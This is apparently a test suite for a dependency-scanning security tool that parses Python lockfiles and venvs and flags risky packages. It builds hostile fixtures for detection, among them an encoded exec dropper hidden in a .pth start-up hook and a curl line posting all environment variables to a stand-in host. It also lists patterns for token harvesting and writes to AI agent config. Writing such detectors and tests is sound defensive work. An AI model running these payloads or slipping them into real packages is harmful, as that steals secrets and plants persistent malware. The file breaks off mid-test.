/**
 * `penthera deps` for Python: lockfile and requirements parsing, the venv
 * reader, the Python capability scanner, .pth and setup.py install-time code,
 * pip/uv cache sources for the diff, PyPI typosquats and the CLI.
 *
 * Fixtures are generated into a temp dir by tests/fixtures/deps/build-python.js
 * and suspicious strings below are assembled at runtime, as in deps.test.js.
 * No network: caches are fixture folders, never the user's own.
 */
import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, rmSync, readFileSync, writeFileSync, mkdirSync, readdirSync } from "node:fs";
import { join, resolve } from "node:path";
import { tmpdir } from "node:os";
import { execFileSync } from "node:child_process";
import { createHash } from "node:crypto";
import { buildPythonFixtures, zip, distFiles } from "./fixtures/deps/build-python.js";
import { parseToml } from "../lib/deps/python/toml.js";
import { parseRequirements, parsePythonInput, normalizeName, findPythonInputs } from "../lib/deps/python/lockfiles.js";
import { blankPython, scanPythonSource, scanPythonPackage, pthImportLines, installedPath } from "../lib/deps/python/capabilities.js";
import { parseRecord, parseMetadata, listInstalled, sitePackagesDirs, unzip, sourceFromArtifact, msgpackFirst, sourceFromPipCache, sourceFromUvCache } from "../lib/deps/python/source.js";
import { checkName, findTyposquats, loadPopular } from "../lib/deps/typosquat.js";
import { scanDeps } from "../lib/deps/index.js";
import { formatPrComment } from "../lib/deps/report.js";
import { MapSource } from "../lib/deps/source.js";
import { loadIocs } from "../lib/deps/iocs.js";
import { riskFindings } from "../lib/deps/findings.js";
import { cpuMs } from "./fixtures/cpu-time.js";

const j = (...p) => p.join("");
const SUBPROCESS = j("sub", "process");
const REQUESTS = j("requ", "ests");
const EXEC = j("ex", "ec");
const ENVIRON = j("os.en", "viron");
const caps = (src) => Object.keys(scanPythonSource(src, "x.py").caps);

let dir;
let fx;
let emptyCache;
const cacheOpts = () => ({ pipCacheDir: fx.pipCache, uvCacheDir: fx.uvCache });

beforeAll(() => {
  dir = mkdtempSync(join(tmpdir(), "penthera-deps-py-"));
  fx = buildPythonFixtures(join(dir, "fx"));
  emptyCache = join(dir, "empty-cache");
  mkdirSync(emptyCache);
});
afterAll(() => rmSync(dir, { recursive: true, force: true }));

// ── TOML ──────────────────────────────────────────────────────────────────

describe("parseToml", () => {
  it("reads lockfile shapes: arrays of tables, inline tables, multi-line arrays", () => {
    const t = parseToml([
      "version = 1",
      "# comment",
      "[[package]]",
      'name = "a"',
      'source = { registry = "https://pypi.org/simple" }',
      "wheels = [",
      '    { url = "https://x/a.whl", hash = "sha256:ab", size = 3 },',
      "]",
      "",
      "[package.optional-dependencies]",
      'cli = [{ name = "b" }]',
      "",
      "[[package]]",
      "name = 'b'",
      'description = """multi',
      'line"""',
      "flag = true",
      "[metadata]",
      'content-hash = "x"',
      "[metadata.files]",
      'a = [{file = "a.whl", hash = "sha256:cd"}]',
    ].join("\n"));
    expect(t.version).toBe(1);
    expect(t.package).toHaveLength(2);
    expect(t.package[0].wheels[0]).toEqual({ url: "https://x/a.whl", hash: "sha256:ab", size: 3 });
    expect(t.package[0]["optional-dependencies"].cli[0].name).toBe("b");
    expect(t.package[1]).toMatchObject({ name: "b", description: "multi\nline", flag: true });
    expect(t.metadata.files.a[0].hash).toBe("sha256:cd");
  });
});

// ── Inputs ────────────────────────────────────────────────────────────────

describe("Python inputs", () => {
  it("normalises names per PEP 503", () => {
    expect(normalizeName("Python_Dateutil")).toBe("python-dateutil");
    expect(normalizeName("zope.interface")).toBe("zope-interface");
  });

  it("parses pinned and hashed requirements, ranges, includes and local paths", () => {
    const r = parseRequirements([
      "# top comment",
      "Requests[socks]==2.31.0 \\",
      "    --hash=sha256:AAAA \\",
      "    --hash=sha256:bbbb",
      "flask>=2.0  # a range",
      "--index-url https://example.invalid/simple",
      "-e ./vendor/thing",
      "numpy==1.26.4 ; python_version >= '3.9'",
    ].join("\n"), { baseDir: "/proj" });
    const by = Object.fromEntries(r.packages.map((p) => [p.name, p]));
    expect(by.requests).toMatchObject({ version: "2.31.0", hashes: ["sha256:aaaa", "sha256:bbbb"], path: "requirements.txt:2" });
    expect(by.flask.version).toBeNull();
    expect(by.numpy.version).toBe("1.26.4");
    expect(by.thing.local).toBe(resolve("/proj/vendor/thing"));
    expect(r.direct).toEqual(["flask", "numpy", "requests", "thing"]);
  });

  it("uses pip-compile '# via' annotations to tell direct from transitive", () => {
    const r = parseRequirements([
      "certifi==2024.2.2",
      "    # via requests",
      "requests==2.31.0",
      "    # via -r requirements.in",
      "urllib3==2.2.1",
      "    # via",
      "    #   requests",
    ].join("\n"));
    expect(r.direct).toEqual(["requests"]);
  });

  it("parses the fixture uv.lock: hashes, URLs, path sources and direct deps", () => {
    const r = parsePythonInput(readFileSync(join(fx.head, "uv.lock"), "utf-8"), "uv.lock", fx.head);
    expect(r.version).toBe(1);
    const by = Object.fromEntries(r.packages.map((p) => [p.name, p]));
    expect(by["env-report"].hashes[0]).toMatch(/^sha256:[0-9a-f]{64}$/);
    expect(by["env-report"].files[0].url).toMatch(/^https:\/\/files\.pythonhosted\.org\//);
    expect(by["fetch-helper"].local).toBe(join(fx.head, "vendor", "fetch-helper"));
    expect(r.direct).toContain("pth-loader");
    expect(r.packages.map((p) => p.name)).not.toContain("demo");
  });

  it("parses poetry.lock, pdm.lock and Pipfile.lock", () => {
    const poetry = parsePythonInput([
      "[[package]]", 'name = "Requests"', 'version = "2.31.0"', 'groups = ["main"]',
      'files = [{file = "requests-2.31.0-py3-none-any.whl", hash = "sha256:aa"}]',
      "[[package]]", 'name = "pytest"', 'version = "8.0.0"', 'groups = ["dev"]', "files = []",
      "[metadata]", 'lock-version = "2.0"',
    ].join("\n"), "poetry.lock", dir);
    expect(poetry.packages.map((p) => [p.name, p.version, p.dev, p.hashes])).toEqual([
      ["pytest", "8.0.0", true, []], ["requests", "2.31.0", false, ["sha256:aa"]],
    ]);
    expect(poetry.version).toBe("2.0");

    const pdm = parsePythonInput([
      "[metadata]", 'lock_version = "4.4"',
      "[[package]]", 'name = "httpx"', 'version = "0.27.0"', 'groups = ["default"]',
      'files = [{file = "httpx-0.27.0.tar.gz", hash = "sha256:bb"}]',
    ].join("\n"), "pdm.lock", dir);
    expect(pdm.packages[0]).toMatchObject({ name: "httpx", version: "0.27.0", hashes: ["sha256:bb"], dev: false });

    const pipenv = parsePythonInput(JSON.stringify({
      _meta: { "pipfile-spec": 6 },
      default: { requests: { version: "==2.31.0", hashes: ["sha256:cc"] } },
      develop: { black: { version: "==24.1.0", hashes: [] } },
    }, null, 4), "Pipfile.lock", dir);
    expect(pipenv.packages.map((p) => [p.name, p.version, p.dev])).toEqual([["black", "24.1.0", true], ["requests", "2.31.0", false]]);
  });

  it("finds lockfiles before requirements files", () => {
    expect(findPythonInputs(fx.head).kind).toBe("uv.lock");
    expect(findPythonInputs(join(dirname(fx.head), "req")).kind).toBe("requirements.txt");
  });
});

function dirname(p) { return resolve(p, ".."); }

// ── Tokenizer and patterns ────────────────────────────────────────────────

describe("blankPython", () => {
  it("blanks comments and docstrings, keeps strings and line numbers", () => {
    const src = [
      '"""Module doc: import socket"""',
      `# import ${SUBPROCESS}`,
      "def f():",
      "    '''Doc mentioning eval(x).'''",
      '    url = "http://x#not-a-comment"',
      "    return url",
    ].join("\n");
    const out = blankPython(src);
    expect(out.split("\n")).toHaveLength(src.split("\n").length);
    expect(out).not.toContain("socket");
    expect(out).not.toContain(SUBPROCESS);
    expect(out).not.toContain("eval(x)");
    expect(out).toContain('"http://x#not-a-comment"');
  });

  it("keeps a docstring that the module decodes and runs", () => {
    const src = `"""cGF5bG9hZA=="""\nimport base64\n${EXEC}(base64.b64decode(__doc__))\n`;
    expect(blankPython(src)).toContain("cGF5bG9hZA==");
  });

  it("does not treat a string argument as a docstring", () => {
    expect(blankPython(`x = f(\n    "import socket"\n)`)).toContain("import socket");
  });
});

describe("scanPythonSource capabilities", () => {
  it("detects shell, network, env, eval, dynamic import, unpickling and native loading", () => {
    expect(caps(`import ${SUBPROCESS}`)).toContain("shell");
    expect(caps("import os\nos.system('ls')")).toContain("shell");
    expect(caps(`import os, ${REQUESTS} as r`)).toContain("network");
    expect(caps("from urllib.request import urlopen")).toContain("network");
    expect(caps("import urllib.parse")).not.toContain("network");
    expect(caps(`v = ${ENVIRON}.get('A')`)).toEqual(["env"]);
    expect(caps(`for k, v in ${ENVIRON}.items(): pass`)).toContain("env-bulk");
    expect(caps(`env = ${ENVIRON}.copy()`)).not.toContain("env-bulk");
    expect(caps("y = eval(x)")).toContain("eval");
    expect(caps("import re\nr = re.compile('x')\ndef eval(s): return s")).not.toContain("eval");
    expect(caps("m = __import__(name)")).toContain("dynamic-require");
    expect(caps("m = __import__('json')")).not.toContain("dynamic-require");
    expect(caps("import pickle\nobj = pickle.loads(data)")).toContain("deserialize");
    expect(caps("yaml.load(s, Loader=yaml.SafeLoader)")).not.toContain("deserialize");
    expect(caps("lib = ctypes.CDLL('libc.so.6')")).toContain("native");
  });

  it("flags writes outside the package only near a home or system path", () => {
    expect(caps("open('out.txt', 'w').write('x')")).not.toContain("fs-write");
    expect(caps("p = os.path.expanduser('~/.bashrc')\nwith open(p, 'a') as f:\n    f.write('x')")).toContain("fs-write");
  });

  it("flags the environment serialised next to network code as exfiltration", () => {
    const src = `import json, ${REQUESTS}\nbody = json.dumps(dict(${ENVIRON}))\n${REQUESTS}.post('https://x.invalid', data=body)`;
    const r = scanPythonSource(src, "x.py");
    expect(r.exfil).toMatchObject({ line: 2 });
    expect(Object.keys(r.caps)).toEqual(expect.arrayContaining(["network", "env-bulk"]));
  });

  it("flags exec of a decoded payload and long encoded blobs", () => {
    expect(caps(`import base64\n${EXEC}(base64.b64decode(p))`)).toContain("obfuscated");
    expect(caps(`import zlib\n${EXEC}(zlib.decompress(b'x'))`)).toContain("obfuscated");
    const blob = Buffer.from(Array.from({ length: 900 }, (_, i) => (i * 7919) % 251)).toString("base64");
    expect(caps(`import base64\nP = "${blob}"\n${EXEC}(base64.b64decode(P))`)).toContain("obfuscated");
    // A palette of \x escapes is data, not obfuscation, without dynamic code beside it.
    const palette = `PAL = b"${"\\x41\\x42\\x43\\x44".repeat(40)}"`;
    expect(caps(palette)).not.toContain("obfuscated");
  });

  it("detects the AI-agent attack indicators", () => {
    const home = "from pathlib import Path\n";
    expect(caps(`${home}p = Path.home() / "${j(".cur", "sor")}" / "mcp.json"\np.write_text("{}")`)).toContain("ai-config-write");
    expect(caps(`import ${SUBPROCESS}\n${SUBPROCESS}.run(["${j("cla", "ude")}", "-p", "find secrets"])`)).toContain("ai-cli-invoke");
    expect(caps(`import ${SUBPROCESS}\nt = ${SUBPROCESS}.check_output(["gh", "auth", "${j("tok", "en")}"])`)).toContain("token-harvest");
  });

  it("flags code that writes a .pth file", () => {
    expect(caps("import site\nd = site.getsitepackages()[0]\nopen(d + '/x.pth', 'w').write('import y')")).toContain("startup-hook");
  });
});

describe(".pth files and setup.py", () => {
  it("only lines starting with 'import' run", () => {
    expect(pthImportLines("/some/path\nimport foo\n  import bar\nimport\tbaz\n").map((l) => l.line)).toEqual([2, 4]);
  });

  it("scores a .pth whose imported module is risky as risky", () => {
    const files = new Map([
      ["evil.pth", Buffer.from(`${j("im", "port")} evil_boot\n`)],
      ["evil_boot.py", Buffer.from(`import socket\n${EXEC}(x)\n`)],
      ["fine.pth", Buffer.from(`${j("im", "port")} _fine\n`)],
      ["_fine.py", Buffer.from("X = 1\n")],
    ]);
    const r = scanPythonPackage(new MapSource(files, "test"));
    expect(r.startupHooks.find((h) => h.file === "evil.pth").risk.join()).toMatch(/evil_boot\.py \(network, eval\)/);
    expect(r.startupHooks.find((h) => h.file === "fine.pth").risk).toEqual([]);
  });

  it("treats setup.py custom commands as install-time code", () => {
    const plain = scanPythonPackage(new MapSource(new Map([["setup.py", Buffer.from("from setuptools import setup\nsetup(name='x')\n")]]), "test"));
    expect(plain.installScripts).toEqual({});
    const custom = scanPythonPackage(new MapSource(new Map([["setup.py", Buffer.from(readFileSync(join(fx.head, "vendor", "fetch-helper", "setup.py")))]]), "test"));
    expect(custom.installScripts["setup.py"]).toMatch(/custom install command/);
    expect(custom.installRisk.join()).toMatch(/network/);
  });
});

// ── Start-up code in wheels (the litellm 1.107.0 layout) ─────────────────

describe("start-up code shipped in a wheel", () => {
  // Built at runtime, never run. The litellm 1.107.0 wheels (OSV MAL-2026-2144)
  // put a .pth and the module it imports under <name>-<version>.data/purelib/,
  // which pip installs at the site-packages root.
  const IMPORT = j("im", "port");
  const DROPPER = `${IMPORT} zlib, base64\n${EXEC}(zlib.decompress(base64.${j("b64", "decode")}(b"eJwDAAAAAAE=")))\n`;
  const data = "boot_kit-1.0.0.data/purelib";
  const wheel = (files) => sourceFromArtifact(zip(distFiles("boot-kit", "1.0.0", { "boot_kit/__init__.py": "X = 1\n", ...files })), "pip-cache");

  it("maps .data/purelib, .data/platlib and data/.../site-packages to the site-packages root", () => {
    expect(installedPath("x-1.0.data/purelib/a.pth")).toBe("a.pth");
    expect(installedPath("x-1.0.data/platlib/pkg/m.py")).toBe("pkg/m.py");
    expect(installedPath("x-1.0.data/data/lib/python3.12/site-packages/a.pth")).toBe("a.pth");
    expect(installedPath("x-1.0.data/scripts/tool")).toBe("x-1.0.data/scripts/tool");
    expect(installedPath("pkg/a.pth")).toBe("pkg/a.pth");
  });

  it("finds a .pth under .data/purelib and resolves the module it imports there", () => {
    const r = scanPythonPackage(wheel({ [`${data}/zz_boot.pth`]: `${IMPORT} zz_boot\n`, [`${data}/zz_boot.py`]: DROPPER }));
    expect(r.startupHooks).toHaveLength(1);
    expect(r.startupHooks[0]).toMatchObject({ file: `${data}/zz_boot.pth`, line: 1 });
    expect(r.startupHooks[0].risk.join()).toMatch(/zz_boot\.py \(.*obfuscated/);
    const f = riskFindings({ ...r, name: "boot-kit", version: "1.0.0", path: "boot-kit", ecosystem: "pypi" });
    expect(f.find((x) => /every Python start/.test(x.title))).toMatchObject({ severity: "high", title: "boot-kit@1.0.0: runs risky code at every Python start (.pth)" });
  });

  it("a .pth nested inside a package directory is not a start-up hook", () => {
    expect(scanPythonPackage(wheel({ "boot_kit/data/x.pth": `${IMPORT} os\n` })).startupHooks).toEqual([]);
  });

  it("flags a shipped sitecustomize.py as high, whatever it contains", () => {
    const r = scanPythonPackage(wheel({ [`${data}/sitecustomize.py`]: "X = 1\n" }));
    expect(r.capabilities["startup-hook"]).toBeDefined();
    expect(r.startupHooks[0].risk.join()).toMatch(/no reason to ship sitecustomize\.py/);
    const f = riskFindings({ ...r, name: "boot-kit", version: "1.0.0", path: "boot-kit", ecosystem: "pypi" });
    expect(f.find((x) => /every Python start/.test(x.title))).toMatchObject({ severity: "high", title: "boot-kit@1.0.0: runs risky code at every Python start (sitecustomize.py)" });
  });

  it("a plain .pth import of clean code is still reported, at medium", () => {
    const r = scanPythonPackage(wheel({ [`${data}/boot_kit.pth`]: `${IMPORT} _boot_kit_shim\n`, "_boot_kit_shim.py": "X = 1\n" }));
    expect(r.startupHooks[0].risk).toEqual([]);
    const f = riskFindings({ ...r, name: "boot-kit", version: "1.0.0", path: "boot-kit", ecosystem: "pypi" });
    expect(f.find((x) => /every Python start/.test(x.title))).toMatchObject({ severity: "medium", title: "boot-kit@1.0.0: runs code at every Python start (.pth)" });
  });

  it("scanDeps reports the wheel a lockfile pins, read from pip's cache", async () => {
    const root = join(dir, "pth-wheel");
    const cache = join(root, "pip-cache");
    const whl = zip(distFiles("boot-kit", "1.0.0", { "boot_kit/__init__.py": "X = 1\n", [`${data}/zz_boot.pth`]: `${IMPORT} zz_boot\n`, [`${data}/zz_boot.py`]: DROPPER }));
    const hex = createHash("sha256").update(whl).digest("hex");
    mkdirSync(join(cache, "http-v2", "c", "d"), { recursive: true });
    writeFileSync(join(cache, "http-v2", "c", "d", "w.body"), whl);
    writeFileSync(join(root, "uv.lock"), [
      "version = 1", 'requires-python = ">=3.12"', "",
      "[[package]]", 'name = "boot-kit"', 'version = "1.0.0"', 'source = { registry = "https://pypi.org/simple" }',
      "wheels = [", `    { url = "https://files.pythonhosted.org/packages/00/00/x/boot_kit-1.0.0-py3-none-any.whl", hash = "sha256:${hex}", size = ${whl.length} },`, "]", "",
      "[[package]]", 'name = "app"', 'version = "0.1.0"', 'source = { virtual = "." }', "dependencies = [", '    { name = "boot-kit" },', "]", "",
    ].join("\n"));
    const r = await scanDeps(root, { pipCacheDir: cache, uvCacheDir: emptyCache });
    expect(r.findings.map((f) => `${f.severity} ${f.title}`)).toContain("high boot-kit@1.0.0: runs risky code at every Python start (.pth)");
  });
});

describe("PyPI indicators from rule packs", () => {
  it("matches PyPI and npm names separately", () => {
    const iocs = loadIocs();
    expect(iocs.matchPackage("litellm", "1.107.0", "pypi").map((h) => h.rule.id)).toEqual(["litellm-pth-stealer"]);
    expect(iocs.matchPackage("litellm", "1.106.2", "pypi")).toEqual([]);
    expect(iocs.matchPackage("litellm", "1.107.0rc2", "pypi")).toEqual([]);
    expect(iocs.matchPackage("litellm", "1.107.0")).toEqual([]);
  });

  it("scanDeps flags a pinned malicious version even when it is not installed", async () => {
    const root = join(dir, "ioc-pin");
    mkdirSync(root, { recursive: true });
    writeFileSync(join(root, "requirements.txt"), "litellm==1.107.0\n");
    const r = await scanDeps(root, { pipCacheDir: emptyCache, uvCacheDir: emptyCache });
    const f = r.findings.find((x) => x.method === "deps-ioc");
    expect(f).toMatchObject({ severity: "critical", title: "litellm@1.107.0: known-malicious version (litellm PyPI compromise)" });
    expect(f.description).toMatch(/osv\.dev\/vulnerability\/MAL-2026-2144/);
    expect(f.description).toMatch(/recreate the virtualenv/);
  });

  it("finds a campaign endpoint in package code", () => {
    const r = scanPythonPackage(new MapSource(new Map([["m.py", Buffer.from(`URL = "https://models.${j("litellm", ".cloud")}/v1"\n`)]]), "test"), { iocs: loadIocs() });
    expect(r.iocHits.map((h) => `${h.type} ${h.value} ${h.file}:${h.line}`)).toEqual(["host litellm.cloud m.py:1"]);
  });
});

// ── Sources ───────────────────────────────────────────────────────────────

describe("Python sources", () => {
  it("parses METADATA and RECORD (including quoted paths)", () => {
    expect(parseMetadata("Metadata-Version: 2.1\nName: Foo_Bar\nVersion: 1.0\n\nLong: no")).toMatchObject({ Name: "Foo_Bar", Version: "1.0" });
    expect(parseRecord('a/b.py,sha256=x,3\n"a/c,d.py",sha256=y,4\na.dist-info/RECORD,,\n')).toEqual([
      { path: "a/b.py", hash: "sha256=x" }, { path: "a/c,d.py", hash: "sha256=y" }, { path: "a.dist-info/RECORD", hash: null },
    ]);
  });

  it("lists installed distributions and unowned .pth files from the venv", () => {
    const [site] = sitePackagesDirs(fx.venv);
    const dists = listInstalled(site);
    expect(dists.map((d) => d.name)).toEqual(["agent-helper", "env-report", "fast-hash", "pth-loader", "reqeusts", "slow-math", "tidy-text"]);
    expect(dists.unownedPth).toEqual(["zz_sitecustom.pth"]);
  });

  it("unzips a wheel and rejects paths that climb out", () => {
    const body = readFileSync(join(fx.pipCache, "http-v2", "a", "b", "c", "d", "e", readdirSync(join(fx.pipCache, "http-v2", "a", "b", "c", "d", "e"))[0]));
    const files = unzip(body);
    expect([...files.keys()]).toContain("env_report/__init__.py");
  });

  it("reads old versions from pip's cache only when the sha256 matches", () => {
    const lock = parsePythonInput(readFileSync(join(fx.base, "uv.lock"), "utf-8"), "uv.lock", fx.base);
    const env = lock.packages.find((p) => p.name === "env-report");
    expect(sourceFromPipCache(env, fx.pipCache)?.kind).toBe("pip-cache");
    expect(sourceFromPipCache({ ...env, hashes: [`sha256:${"0".repeat(64)}`] }, fx.pipCache)).toBeNull();
  });

  it("reads old versions from uv's cache when the recorded hash matches", () => {
    const lock = parsePythonInput(readFileSync(join(fx.base, "uv.lock"), "utf-8"), "uv.lock", fx.base);
    const sm = lock.packages.find((p) => p.name === "slow-math");
    expect(sourceFromUvCache(sm, fx.uvCache)?.kind).toBe("uv-cache");
    expect(sourceFromUvCache({ ...sm, hashes: [`sha256:${"1".repeat(64)}`], files: [] }, fx.uvCache)).toBeNull();
  });

  it("decodes the msgpack head of a uv pointer", () => {
    expect(msgpackFirst(Buffer.from([0x93, 0xa1, 0x61, 0x90, 0xc3]))).toEqual(["a", [], true]);
  });
});

// ── PyPI typosquats ───────────────────────────────────────────────────────

describe("PyPI typosquat check", () => {
  it("vendors a PEP 503 normalised popular list", () => {
    const p = loadPopular("pypi");
    expect(p.names.length).toBeGreaterThan(1000);
    expect(p.set.has("requests")).toBe(true);
    expect(p.names.every((n) => n === normalizeName(n))).toBe(true);
  });

  it("flags near misses and affixes, not the same project spelled differently", () => {
    const pypi = loadPopular("pypi");
    expect(checkName("reqeusts", pypi)).toMatchObject({ target: "requests" });
    expect(checkName("python3-dateutil", pypi)).toMatchObject({ target: "python-dateutil" });
    expect(checkName("requests-py", pypi)).toMatchObject({ kind: "popular name plus a python/py affix" });
    expect(checkName("pythondateutil", pypi)).toMatchObject({ kind: "separator or scope swap" });
    expect(checkName(normalizeName("python_dateutil"), pypi)).toBeNull();
    expect(findTyposquats(["numpy", "reqeusts"], "pypi").map((h) => h.name)).toEqual(["reqeusts"]);
  });
});

// ── scanDeps ──────────────────────────────────────────────────────────────

describe("scanDeps on a Python project", () => {
  it("scans the venv against the lockfile with file:line evidence", async () => {
    const r = await scanDeps(fx.head, cacheOpts());
    expect(r.deps).toMatchObject({ ecosystem: "pypi", total: 8, scanned: 8, format: "uv.lock v1 + venv" });
    const titles = r.findings.map((f) => `${f.severity} ${f.title}`);
    expect(titles).toEqual(expect.arrayContaining([
      "critical agent-helper@0.2.0: writes AI agent config",
      "high env-report@1.1.0: serialises the whole environment next to network code",
      "high pth-loader@0.1.0: runs risky code at every Python start (.pth)",
      "high pth-loader@0.1.0: obfuscated code",
      "high Unowned startup hook zz_sitecustom.pth in site-packages",
      "medium fetch-helper@0.3.0: runs a risky install script",
      "medium tidy-text@1.0.0: 1 installed file(s) changed since install",
      "medium reqeusts looks like requests (one edit away)",
    ]));
    const exfil = r.findings.find((f) => f.title.includes("serialises"));
    expect(exfil).toMatchObject({ category: "dependency-risk", source: "deps-scan", url: ".venv/lib/python3.12/site-packages/env_report/__init__.py", line: 9 });
    expect(exfil.description).toMatch(/os\.environ/);
    const native = r.deps.packages.find((p) => p.name === "fast-hash");
    expect(Object.keys(native.capabilities)).toContain("native");
    // The benign package has no risk finding of its own (only the tamper check).
    expect(r.findings.filter((f) => f.package === "tidy-text").map((f) => f.title)).toEqual(["tidy-text@1.0.0: 1 installed file(s) changed since install"]);
  });

  it("diffs against the base lockfile using pip's and uv's caches", async () => {
    const r = await scanDeps(fx.head, { ...cacheOpts(), diff: join(fx.base, "uv.lock") });
    const d = r.deps.diff;
    expect(d.added.map((a) => a.name)).toEqual(["agent-helper", "fast-hash", "fetch-helper", "pth-loader", "reqeusts"]);
    const up = Object.fromEntries(d.upgraded.map((u) => [u.name, u]));
    expect(up["env-report"].gained).toEqual(["network", "env-bulk"]);
    expect(up["slow-math"].gained).toEqual(["shell"]);
    expect(up["tidy-text"].unavailable).toBe("old");
    expect(r.findings.find((f) => f.method === "deps-capability-diff" && f.severity === "info").description).toMatch(/uv sync/);
    const pr = formatPrComment(r);
    expect(pr).toContain("| **env-report** | 1.0.0 → 1.1.0 | network, whole environment |");
  });

  it("marks old versions 'not compared' when no cache has them", async () => {
    const r = await scanDeps(fx.head, { pipCacheDir: emptyCache, uvCacheDir: emptyCache, diff: join(fx.base, "uv.lock") });
    expect(r.deps.diff.upgraded.every((u) => u.unavailable === "old")).toBe(true);
  });

  it("--base reads the old Python lockfile from git", async () => {
    const repo = join(dir, "git-py");
    mkdirSync(repo);
    const git = (...a) => execFileSync("git", a, { cwd: repo, stdio: "pipe", env: { ...process.env, GIT_AUTHOR_NAME: "t", GIT_AUTHOR_EMAIL: "t@t", GIT_COMMITTER_NAME: "t", GIT_COMMITTER_EMAIL: "t@t" } });
    git("init", "-q");
    writeFileSync(join(repo, "uv.lock"), readFileSync(join(fx.base, "uv.lock")));
    git("add", "uv.lock");
    git("commit", "-qm", "base");
    writeFileSync(join(repo, "uv.lock"), readFileSync(join(fx.head, "uv.lock")));
    const r = await scanDeps(repo, { pipCacheDir: emptyCache, uvCacheDir: emptyCache, base: "HEAD" });
    expect(r.deps.diff.base).toBe("HEAD");
    expect(r.deps.diff.added.map((a) => a.name)).toContain("pth-loader");
  });

  it("scans a bare venv without a lockfile", async () => {
    const venvOnly = join(dir, "venv-only");
    mkdirSync(venvOnly);
    const r = await scanDeps(venvOnly, { venv: fx.venv, pipCacheDir: emptyCache, uvCacheDir: emptyCache });
    expect(r.deps.format).toBe("virtualenv");
    expect(r.deps.total).toBe(7);
    expect(r.deps.direct).toContain("reqeusts");
  });

  it("explains what it reads when there is nothing to scan", async () => {
    const empty = join(dir, "nothing");
    mkdirSync(empty);
    await expect(scanDeps(empty)).rejects.toThrow(/uv\.lock, poetry\.lock/);
  });

  it("keeps the network out of the Python modules", () => {
    for (const f of readdirSync(resolve("lib/deps/python"))) {
      const src = readFileSync(resolve("lib/deps/python", f), "utf-8");
      expect(src, f).not.toMatch(/(?<![\w.])fetch\s*\(|node:(?:http|https|net|dgram|tls)\b/);
    }
  });
});

// ── CLI ───────────────────────────────────────────────────────────────────

describe("penthera deps CLI (Python)", () => {
  const BIN = resolve("bin/penthera.js");
  const run = (args) => {
    try {
      const out = execFileSync(process.execPath, [BIN, ...args], {
        encoding: "utf-8",
        stdio: ["ignore", "pipe", "pipe"],
        env: { ...process.env, NO_COLOR: "1", PENTHERA_NO_ONBOARDING: "1", PIP_CACHE_DIR: fx.pipCache, UV_CACHE_DIR: fx.uvCache },
      });
      return { code: 0, out };
    } catch (e) {
      return { code: e.status, out: `${e.stdout}${e.stderr}` };
    }
  };

  it("prints the Python capability diff with evidence and exits 1", () => {
    const { code, out } = run(["deps", fx.head, "--diff", join(fx.base, "uv.lock")]);
    expect(code).toBe(1);
    expect(out).toMatch(/env-report 1\.0\.0 → 1\.1\.0 {2}\+ network, whole environment/);
    expect(out).toMatch(/env_report\/__init__\.py:9/);
  });

  it("accepts --venv and emits JSON", () => {
    const empty = join(dir, "cli-venv");
    mkdirSync(empty, { recursive: true });
    const { out } = run(["deps", empty, "--venv", fx.venv, "--json"]);
    const json = JSON.parse(out);
    expect(json.deps.ecosystem).toBe("pypi");
    expect(json.deps.packages.length).toBe(7);
  });
});

describe("hostile Python input stays cheap", () => {
  it("tokenizes unterminated strings and long lines in linear time", () => {
    const hostile = `x = "${"\\\\".repeat(100_000)}\n'''${"a".repeat(200_000)}`;
    expect(cpuMs(() => {
      blankPython(hostile);
      scanPythonSource(hostile, "x.py");
    })).toBeLessThan(1000);
  });

  it("rejects a TOML document it cannot read instead of looping", () => {
    expect(() => parseToml("[[package]]\nname = \n")).toThrow(/TOML/);
    expect(() => parseToml("a = [1, 2")).toThrow(/TOML/);
  });

  it("a deeply nested lockfile is a parse error, not a stack overflow", async () => {
    const deep = `version = 1\n[[package]]\nname = "x"\nversion = "1"\nwheels = ${"[".repeat(200_000)}\n`;
    expect(() => parseToml(deep)).toThrow(/TOML: nested deeper than 200 levels/);
    expect(() => parseToml(`a = ${"{ b = ".repeat(300)}1${" }".repeat(300)}`)).toThrow(/nested deeper/);
    expect(parseToml(`a = ${"[".repeat(150)}1${"]".repeat(150)}`).a).toBeDefined();
    const root = join(dir, "deep-lock");
    mkdirSync(root, { recursive: true });
    writeFileSync(join(root, "uv.lock"), deep);
    await expect(scanDeps(root, { pipCacheDir: emptyCache, uvCacheDir: emptyCache })).rejects.toThrow(/uv\.lock could not be parsed: TOML: nested deeper/);
  });
});

// ── Python sources fail closed ────────────────────────────────────────────

describe("Python sources fail closed", () => {
  const PAYLOAD = `import os\nimport ${SUBPROCESS}\n${SUBPROCESS}.run(["curl", "-d", str(dict(${ENVIRON})), "https://c.invalid"])\n`;
  const wheelFiles = () => distFiles("evilpkg", "1.0.0", { "aaa/pad.txt": "pad", "evilpkg/__init__.py": PAYLOAD });
  /** The wheel above, with its first entry's central-directory size set to `claim`. */
  function forgedWheel(claim) {
    const w = zip(wheelFiles());
    const cd = w.readUInt32LE(w.length - 22 + 16);
    expect(w.subarray(cd + 46, cd + 46 + 11).toString()).toBe("aaa/pad.txt");
    w.writeUInt32LE(claim, cd + 24);
    return w;
  }

  it("a forged central-directory size makes the wheel unscanned instead of hiding later entries", () => {
    expect(() => unzip(forgedWheel(300 * 1024 * 1024))).toThrow(/"aaa\/pad.txt" holds 3 bytes, the archive says 314572800/);
    const r = scanPythonPackage(sourceFromArtifact(forgedWheel(300 * 1024 * 1024), "pip-cache"));
    expect(r.unscanned).toMatch(/could not be read safely.*aaa\/pad\.txt/);
    // The honest wheel is read whole, payload included.
    const honest = scanPythonPackage(sourceFromArtifact(zip(wheelFiles()), "pip-cache"));
    expect(honest.unscanned).toBeNull();
    expect(Object.keys(honest.capabilities)).toContain("shell");
  });

  it("throws on structural anomalies rather than stopping early", () => {
    const good = zip({ "a.py": "x = 1\n", "b.py": "y = 2\n" });
    expect(unzip(good).size).toBe(2);
    const cd = good.readUInt32LE(good.length - 22 + 16);
    const badSig = Buffer.from(good);
    badSig.writeUInt32LE(0, cd);
    expect(() => unzip(badSig)).toThrow(/bad central directory record/);
    const badLocal = Buffer.from(good);
    badLocal.writeUInt32LE(0, 0);
    expect(() => unzip(badLocal)).toThrow(/bad local header/);
    const badMethod = Buffer.from(good);
    badMethod.writeUInt16LE(99, cd + 10);
    expect(() => unzip(badMethod)).toThrow(/compression method 99/);
    expect(() => unzip(good, { maxTotal: 8 })).toThrow(/over 8 bytes/);
  });

  it("a source with an anomaly, no files, or more files than listed is unscanned", () => {
